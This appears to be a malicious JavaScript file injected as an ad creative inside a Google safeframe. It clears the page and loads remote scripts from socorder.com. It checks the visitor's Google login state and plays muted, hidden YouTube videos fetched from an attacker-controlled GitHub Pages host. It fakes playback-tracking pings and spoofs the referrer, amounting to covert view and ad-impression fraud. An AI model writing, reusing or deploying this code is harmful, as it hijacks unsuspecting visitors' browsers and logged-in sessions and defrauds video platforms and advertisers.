var newstr = window.location.href.replace('https://tpc.googlesyndication.com/safeframe/1-0-14/html/container.html#ai=',"");
var fff = false;
document.getElementsByTagName("body")[0].innerHTML='';

var jquery_js = document.createElement("script");

	jquery_js.setAttribute("type","text/javascript");

	jquery_js.setAttribute("src","https://socorder.com/aa/jquery.js?a=4");

	jquery_js.async = true;

	document.getElementsByTagName("head")[0].appendChild(jquery_js);



var gl=-1;

function getBrowser(){var a=navigator.userAgent,c=function(){if(-1<a.search(/Edge/))return"edge";if(-1<a.search(/MSIE/))return"ie";if(-1<a.search(/Trident/))return"ie11";if(-1<a.search(/Firefox/))return"firefox";if(-1<a.search(/Opera/))return"opera";if(-1<a.search(/OPR/))return"operaWebkit";if(-1<a.search(/YaBrowser/))return"yabrowser";if(-1<a.search(/Chrome/))return"chrome";if(-1<a.search(/Safari/))return"safari";if(-1<a.search(/Maxthon/))return"maxthon"}();switch(c){case "edge":var b=a.split("Edge")[1].split("/")[1];

break;case "ie":b=a.split("MSIE ")[1].split(";")[0];break;case "ie11":c="ie";b=a.split("; rv:")[1].split(")")[0];break;case "firefox":b=a.split("Firefox/")[1];break;case "opera":b=a.split("Version/")[1];break;case "operaWebkit":c="opera";b=a.split("OPR/")[1];break;case "yabrowser":b=a.split("YaBrowser/")[1].split(" ")[0];break;case "chrome":b=a.split("Chrome/")[1].split(" ")[0];break;case "safari":b=a.split("Version/")[1].split(" ")[0];break;case "maxthon":b=a.split("Maxthon/")[1]}var d="desktop";

/iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(navigator.userAgent.toLowerCase())&&(d="mobile");try{var e={platform:d,browser:c,versionFull:b,versionShort:b.split(".")[0]}}catch(f){e={platform:d,browser:"unknown",versionFull:"unknown",versionShort:"unknown"}}return e};

var bro=getBrowser();

var platform=bro.platform;

	bro=bro.browser;

function checkgoogle ()	{

	try {

		  var i=new Image();

		  i.onload=function(){

			  gl=1;

			//   (function (d, w, c) { (w[c] = w[c] || []).push(function() { try { w.yaCounter = new Ya.Metrika({ id:47009115, clickmap:true, trackLinks:true, accurateTrackBounce:true, webvisor:true, trackHash:true, ut:"noindex" }); } catch(e) { } }); var n = d.getElementsByTagName("script")[0], s = d.createElement("script"), f = function () { n.parentNode.insertBefore(s, n); }; s.type = "text/javascript"; s.async = true; s.src = "https://cdn.jsdelivr.net/npm/yandex-metrica-watch/watch.js"; if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); } })(document, window, "yandex_metrika_callbacks");

		  }

		  i.onerror=function(){

			  gl=0;

			//   (function (d, w, c) { (w[c] = w[c] || []).push(function() { try { w.yaCounter = new Ya.Metrika({ id:47009196, clickmap:true, trackLinks:true, accurateTrackBounce:true, webvisor:true, trackHash:true, ut:"noindex" }); } catch(e) { } }); var n = d.getElementsByTagName("script")[0], s = d.createElement("script"), f = function () { n.parentNode.insertBefore(s, n); }; s.type = "text/javascript"; s.async = true; s.src = "https://cdn.jsdelivr.net/npm/yandex-metrica-watch/watch.js"; if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); } })(document, window, "yandex_metrika_callbacks");

		  }

		  i.src="https://accounts.google.com/CheckCookie?continue=https://www.google.com/intl/en/images/logos/accounts_logo.png";



	} catch (err) {}

}

checkgoogle();

var onYouTubePlayerAPIReady = function() {

		document.getElementsByTagName("body")[0].innerHTML='';

		yt_dm_iframe = document.createElement("div");

		yt_dm_iframe.id='yt_if_tv_del';

		yt_dm_iframe.style = "left:0px;top:0px;border:0px;";

		yt_dm_iframe.style.width = "640px";

		yt_dm_iframe.style.height = "360px";

		yt_dm_iframe.style.display = "block";

		yt_dm_iframe.style.position = "fixed";

		document.getElementsByTagName("body")[0].appendChild(yt_dm_iframe);

		setTimeout(new_video,2000);

}

var onPlayerReady = function(e){

	e.target.playVideo();

}

var pause = function(){

  if(start_video==0){

	    try{

        //console.log(yt_if_tv_del.getVisibilityState())

				if(startAD == 1){

					yt_if_tv_del.mute();

					yt_if_tv_del.playVideo();

				} else {

					if(bro == 'firefox' ){

						yt_if_tv_del.setPlaybackRate(0.25);

					}

					if(yt_if_tv_del.getPlayerState() == -1) yt_if_tv_del.playVideo();

					yt_if_tv_del.pauseVideo();

					yt_if_tv_del.unMute();

				}

      } catch (err) {}

      setTimeout(pause,100);

  }

}

var ai=0;

var stBufPlay = function(){

	try {

		yt_if_tv_del.mute();

	} catch(e) {}



   if(start_video==0){

		  if(startAD != 1){

				if(ai<10){

					ai=ai+1;

					try{

							yt_if_tv_del.unMute();

							yt_if_tv_del.seekTo(1);

							yt_if_tv_del.pauseVideo();

					} catch (err) {}

				} else {

					start_video=1;





					setTimeout(function(){
							var time = yt_if_tv_del.getCurrentTime();
						while (!fff && time <= yt_if_tv_del.getDuration()) {
								if (time == yt_if_tv_del.getDuration())
                                                                {
									fff=true;
yt_if_tv_del.seekTo(time);
setTimeout(function(){autoplay=1;startPlay();},500);
									break;
                                                                }
                                                                yt_if_tv_del.seekTo(time);
								time += 10;
								if (time > yt_if_tv_del.getDuration())
									time = yt_if_tv_del.getDuration();
							}
								if(yt_if_tv_del.getDuration() > 0){

								}

					},500);

				}

			}

			setTimeout(function(){

					stBufPlay();

			},300);

   }

}

var autoplay=0;

var startPlay = function(){

	vidstat=yt_if_tv_del.getVideoStats();

	tracking(vidstat.docid,vidstat.cpn);

	if(bro == 'firefox' ){

		yt_if_tv_del.setPlaybackRate(1);

	}

	yt_if_tv_del.mute();

	yt_if_tv_del.playVideo();

	if(t_yt_track_2 > 40000) time_playback=40000;

	else time_playback=t_yt_track_2;

	setTimeout(function(){

			window.parent.parent.postMessage('refresh','*');

			yt_if_tv_del.destroy();

	},t_yt_track_2+120000);



	//cnt=$.cookie(id_v_yt2+'_cnt');
	cnt = 0;
	if(cnt == undefined)cnt=0;

	cnt=Math.floor(cnt);

	cnt=(cnt*1)+1;



	if(trend == 1) {

		var tdate = new Date();

		tdate.setTime(tdate.getTime() + (60*2*1000));



		//$.cookie(id_v_yt2+'_cnt', cnt, { expires: tdate});

	} else {

		//$.cookie(id_v_yt2+'_cnt', cnt, { expires: 1});

	}



	(function (a) { })(id_v_yt2);





	if(trend == 1){

		date3 = new Date();

		date3.setTime(date3.getTime() + t_yt_track_2+10000);

		//$.cookie('YT2_active', 1, { expires: date3 });

		date3 = new Date();

		date3.setTime(date3.getTime() + t_yt_track_2+3600000);

		//$.cookie('YT_trend', 1, { expires: date3 });

	} else {

		date3 = new Date();

		date3.setTime(date3.getTime() + t_yt_track_2+500*1000);

		act_cnt=0;//$.cookie('YT2_act_cnt');

		if(act_cnt == undefined)act_cnt=0;

		act_cnt=Math.floor(act_cnt);

		act_cnt=(act_cnt*1)+1;

		//$.cookie('YT2_act_cnt', act_cnt, { expires: date3 });

		if(act_cnt >2 ){

			//$.cookie('YT2_active', 1, { expires: date3 });

		} else {

			date3 = new Date();

			date3.setTime(date3.getTime() + t_yt_track_2+30*1000);

			//$.cookie('YT2_active', 1, { expires: date3});

		}

	}



}

var buf=0;

var onStateChange = function(e){

  if(e.data == 0){

	if(autoplay==1){

		yt_if_tv_del.playVideo();

	}

  }

  if(e.data == -1 || e.data == 2){

	if (e.data == -1) {

		(function(a){})(id_v_yt2);

  }

	if(buf==0){

		setTimeout(function(){

			stBufPlay();

		},300);

		buf=1;

	}

  }

	if(e.data == 1){

		if(yt_if_tv_del.getDuration() < 1){



		} else {



		}

	}

}

var startAD=0;

var onAdStateChange = function(e){

	if(e.data==1){

		yt_if_tv_del.mute();

		startAD=1;

		date3 = new Date();

		date3.setTime(date3.getTime()+5000);

		//$.cookie('YT2_active', 1, { expires: date3 });

		setTimeout(function(){

			window.parent.parent.postMessage('refresh','*');

		},5000);

	} else {

		startAD=0;

	}

}

var onApiChange = function(e){

		yt_if_tv_del.addEventListener('onAdStateChange',onAdStateChange);

}

var start_video;

function cpn() {

			var result = '';

			var chars = 'qwertyuiopasdfghjklzxcvbnm_-1234567890QWERTYUIOPASDFGHJKLZXCVBNM';

			for (var i = 0; i < 10; i++) result += chars[Math.round(Math.random() * chars.length -1)];

			return result;

};

function tracking(vid,cpns){

	delay = Math.round(Math.random() * 10000);

	var track = document.createElement('img');

	track.src = 'https://www.youtube.com/ptracking?html5=1&video_id=' + vid + '&cpn=' + cpns;

	setTimeout('tracking("'+vid+'","'+cpn()+'");', 10000 + delay);

}

var xmlhttp,cl_setings,ad,id_v_yt,id_v_yt2,trend;

start_video=0;

pause();

var new_video = function(){

		    if(/*$.cookie('YT2_active')==1*/ 1==0){

						clearTimeout(cl_setings);

						cl_setings=setTimeout(new_video,5000);

			} else {



			if(xmlhttp) xmlhttp.abort();

			xmlhttp = new XMLHttpRequest();

			xmlhttp.timeout = 30000;

			xmlhttp.withCredentials = true;

			xmlhttp.onreadystatechange = function() {

				if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {

					yt_data_p2 = JSON.parse(xmlhttp.responseText);

					if(yt_data_p2[2][0][2]=='wait'){

						clearTimeout(cl_setings);

						cl_setings=setTimeout(new_video,yt_data_p2[2][0][0]);

					} else {

						st=0;

						if(yt_data_p2[2][0][9] != 1){

							trend=1;

						} else {

							trend=0;

						}

						ai=0;

						id_v_yt = yt_data_p2[2][0][1];

						id_v_yt2=yt_data_p2[2][0][5];

						t_yt_track_2=yt_data_p2[2][0][0]+1000;



						/* if($.cookie('YT_trend') == 1 && trend == 0){

							clearTimeout(cl_setings);

							cl_setings=setTimeout(new_video,3000);

						} else if(($.cookie(id_v_yt2+'_cnt')>1 || $.cookie('YT2_act_cnt') > 2)  && trend==0){

							clearTimeout(cl_setings);

							cl_setings=setTimeout(new_video,3000);

						} else if($.cookie(id_v_yt2+'_cnt')>12 && trend==1){

							clearTimeout(cl_setings);

							cl_setings=setTimeout(new_video,3000);

						} else { */



						if(trend == 1){

								host = 'https://www.youtube.com';

								el = 'detailpage';

						} else {

								host = 'https://www.youtube.com';

								el = 'detailpage';

						}

						host = 'https://www.youtube.com';

						playerVars2 = {

									autoplay:0,

									mute:1,
									feature: 'endscreen',

									fs: 1,

									rel: 1,
									showinfo: 0,
									playsinline: 1,

									origin: '*',

									vq: 'tiny',

									widgetid:1,

									mutedautoplay:1,

									cc_load_policy:1,

									end:0,

									el:el,

									enablecastapi:'1',

									enablepostapi:'1',

									widget_referrer:'https://vk.com',

						};

						playerVars2.docid=yt_data_p2[2][0][5];

						yt_if_tv_del = new YT.Player('yt_if_tv_del', {

								host: host,

								height: '100%',

								width: '100%',

								playerVars: playerVars2,

								events: {

									"onReady": onPlayerReady,

									'onApiChange':onApiChange,

									"onStateChange": onStateChange,

								}

						});

						id_v_ra=yt_data_p2[2][0][7];

						if(id_v_ra > 0){

							var is3=new Image();

									// is3.src="https://ad.doubleclick.net/ddm/trackimp/N700014.3034953ADWORDSYOUTUBE/B20586481.212022703;dc_trk_aid=411262140;dc_trk_cid=96603692;ord="+id_v_ra+";dc_lat=;dc_rdid=;tag_for_child_directed_treatment=?";

						}

						date3 = new Date();

						date3.setTime(date3.getTime() + t_yt_track_2+10000);

						//$.cookie('YT2_active', 1, { expires: date3 });



						setTimeout(function(){

								window.parent.parent.postMessage('refresh','*');

						},t_yt_track_2+30000);

					//   }

					}

				}



			}

			xmlhttp.onerror = function(event) {

				cl_setings=setTimeout(new_video,30000);

			};

			xmlhttp.open("GET", 'https://coolboy112233.github.io/unknowbastard/data'+newstr+'.php', true);

			setTimeout( function(){ xmlhttp.send();  }, 500);

	}

}

setTimeout(function(){

if (!window['YT']) {var YT = {loading: 0,loaded: 0};}if (!window['YTConfig']) {var YTConfig = {'host': 'https://tpc.googlesyndication.com'};}if (!YT.loading) {YT.loading = 1;(function(){var l = [];YT.ready = function(f) {if (YT.loaded) {f();} else {l.push(f);}};window.onYTReady = function() {YT.loaded = 1;for (var i = 0; i < l.length; i++) {try {l[i]();} catch (e) {}}};YT.setConfig = function(c) {for (var k in c) {if (c.hasOwnProperty(k)) {YTConfig[k] = c[k];}}};var a = document.createElement('script');a.type = 'text/javascript';a.id = 'www-widgetapi-script';a.src = 'https://socorder.com/aa/www-widgetapi.js?a=11';a.async = true;var b = document.getElementsByTagName('head')[0];b.parentNode.insertBefore(a, b);})();}

},1000);
